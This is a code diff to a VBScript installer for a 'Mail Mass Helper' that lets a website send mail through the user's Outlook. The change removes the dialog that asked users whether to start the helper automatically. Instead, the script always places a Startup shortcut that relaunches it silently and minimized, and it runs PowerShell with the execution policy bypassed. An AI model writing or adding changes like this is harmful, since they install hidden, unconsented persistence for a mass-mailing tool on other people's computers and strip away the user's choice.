@@ -7,8 +7,8 @@
 Option Explicit
 
 Dim sh, fso, http, stream
-Dim installDir, ps1Path, starterPath, urlPs1, cmd, startup, linkPath, ans
-Dim baseUrls, i, downloaded
+Dim installDir, ps1Path, starterPath, urlPs1, cmd, startup, linkPath
+Dim baseUrls, i, downloaded, sc
 
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
@@ -47,26 +47,15 @@ End If
 ' Keep a starter copy in the install folder for Startup
 fso.CopyFile WScript.ScriptFullName, starterPath, True
 
+' Always keep a Startup shortcut so the helper comes back after reboot
 startup = sh.SpecialFolders("Startup")
 linkPath = startup & "\Mail Mass Helper.lnk"
-If Not fso.FileExists(linkPath) Then
-  ans = MsgBox( _
-    "Mail Mass Helper installs a small program on THIS computer only." & vbCrLf & vbCrLf & _
-    "It lets the website send mail through YOUR Outlook." & vbCrLf & _
-    "Other people install it on their own PCs the same way." & vbCrLf & vbCrLf & _
-    "Start the helper automatically when Windows starts?" & vbCrLf & _
-    "(Recommended)", _
-    vbYesNo + vbQuestion, "Mail Mass Helper")
-  If ans = vbYes Then
-    Dim sc
-    Set sc = sh.CreateShortcut(linkPath)
-    sc.TargetPath = "wscript.exe"
-    sc.Arguments = """" & starterPath & """ /silent"
-    sc.WorkingDirectory = installDir
-    sc.WindowStyle = 7
-    sc.Save
-  End If
-End If
+Set sc = sh.CreateShortcut(linkPath)
+sc.TargetPath = "wscript.exe"
+sc.Arguments = """" & starterPath & """ /silent"
+sc.WorkingDirectory = installDir
+sc.WindowStyle = 7
+sc.Save
 
 cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & ps1Path & """"
 If WScript.Arguments.Named.Exists("silent") Then
